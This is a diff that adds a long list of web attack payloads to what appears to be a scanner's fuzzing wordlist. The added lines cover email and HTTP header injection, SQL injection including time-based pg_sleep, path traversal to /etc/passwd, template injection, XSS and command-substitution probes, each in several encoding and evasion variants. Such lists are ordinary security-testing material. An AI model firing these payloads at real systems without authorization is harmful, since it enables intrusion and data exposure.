@@ -78,3 +78,175 @@ victim@example.com?v=3
 victim@example.com&v=3
 victim%40example.com_3
 mailheader_3
+victim%2540example.com%25250d%25250aBcc%253Aattacker%2540example.com
+victim@example.com%0d%0aBcc:attacker@example.com?aurose=1
+victim@example.com%0d%0aBcc:attacker@example.com&aurose=1
+test@example.com%0d%0aCc:attacker@example.com
+test%40example.com%250d%250aCc%3Aattacker%40example.com
+test%2540example.com%25250d%25250aCc%253Aattacker%2540example.com
+TEST@EXAMPLE.COM%0D%0ACC:ATTACKER@EXAMPLE.COM
+test@example.com%0d%0aCc:attacker@example.com?aurose=1
+test@example.com%0d%0aCc:attacker@example.com&aurose=1
+a@b.com%0d%0aSubject:owned
+a%40b.com%250d%250aSubject%3Aowned
+a%2540b.com%25250d%25250aSubject%253Aowned
+A@B.COM%0D%0ASUBJECT:OWNED
+a@b.com%0d%0aSubject:owned?aurose=1
+a@b.com%0d%0aSubject:owned&aurose=1
+name
+Bcc:attacker@example.com
+name%0ABcc%3Aattacker%40example.com
+name%250ABcc%253Aattacker%2540example.com
+NAME
+BCC:ATTACKER@EXAMPLE.COM
+name
+Bcc:attacker@example.com?aurose=1
+name
+Bcc:attacker@example.com&aurose=1
+x@y.z
+X-Header: injected
+x%40y.z%0D%0AX-Header%3A%20injected
+x%2540y.z%250D%250AX-Header%253A%2520injected
+x@y.z
+X-Header:/**/injected
+X@Y.Z
+X-HEADER: INJECTED
+x@y.z
+X-Header: injected?aurose=1
+x@y.z
+X-Header: injected&aurose=1
+"attacker" <a@evil.tld>
+%22attacker%22%20%3Ca%40evil.tld%3E
+%2522attacker%2522%2520%253Ca%2540evil.tld%253E
+"attacker"/**/<a@evil.tld>
+"ATTACKER" <A@EVIL.TLD>
+"attacker" <a@evil.tld>?aurose=1
+"attacker" <a@evil.tld>&aurose=1
+to@example.com,attacker@evil.tld
+to%40example.com%2Cattacker%40evil.tld
+to%2540example.com%252Cattacker%2540evil.tld
+TO@EXAMPLE.COM,ATTACKER@EVIL.TLD
+to@example.com,attacker@evil.tld?aurose=1
+to@example.com,attacker@evil.tld&aurose=1
+=?UTF-8?B?QmNjOiBhdHRhY2tlcg==?=
+%3D%3FUTF-8%3FB%3FQmNjOiBhdHRhY2tlcg%3D%3D%3F%3D
+%253D%253FUTF-8%253FB%253FQmNjOiBhdHRhY2tlcg%253D%253D%253F%253D
+%3d?UTF-8?B?QmNjOiBhdHRhY2tlcg%3d%3d?%3d
+=?UTF-8?B?QMNJOIBHDHRHY2TLCG==?=
+=?UTF-8?B?QmNjOiBhdHRhY2tlcg==?=?aurose=1
+=?UTF-8?B?QmNjOiBhdHRhY2tlcg==?=&aurose=1
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+victim@example.com%0d%0aBcc:attacker@example.com::var0
+victim%40example.com%250d%250aBcc%3Aattacker%40example.com::v0
+/mailheader/probe/0
+test@example.com%0d%0aCc:attacker@example.com::var1
+test%40example.com%250d%250aCc%3Aattacker%40example.com::v1
+/mailheader/probe/1
+a@b.com%0d%0aSubject:owned::var2
+a%40b.com%250d%250aSubject%3Aowned::v2
+/mailheader/probe/2
+name
+Bcc:attacker@example.com::var3
+name%0ABcc%3Aattacker%40example.com::v3
+/mailheader/probe/3
+x@y.z
+X-Header: injected::var4
+x%40y.z%0D%0AX-Header%3A%20injected::v4
+/mailheader/probe/4
+"attacker" <a@evil.tld>::var5
+%22attacker%22%20%3Ca%40evil.tld%3E::v5
+/mailheader/probe/5
+to@example.com,attacker@evil.tld::var6
+to%40example.com%2Cattacker%40evil.tld::v6
+/mailheader/probe/6
+=?UTF-8?B?QmNjOiBhdHRhY2tlcg==?=::var7
+%3D%3FUTF-8%3FB%3FQmNjOiBhdHRhY2tlcg%3D%3D%3F%3D::v7
+/mailheader/probe/7
+' OR '1'='1::var8
+%27%20OR%20%271%27%3D%271::v8
+/mailheader/probe/8
+" OR "1"="1::var9
+%22%20OR%20%221%22%3D%221::v9
+/mailheader/probe/9
+' AND 1=1 --::var10
+%27%20AND%201%3D1%20--::v10
+/mailheader/probe/10
+' AND 1=2 --::var11
+%27%20AND%201%3D2%20--::v11
+/mailheader/probe/11
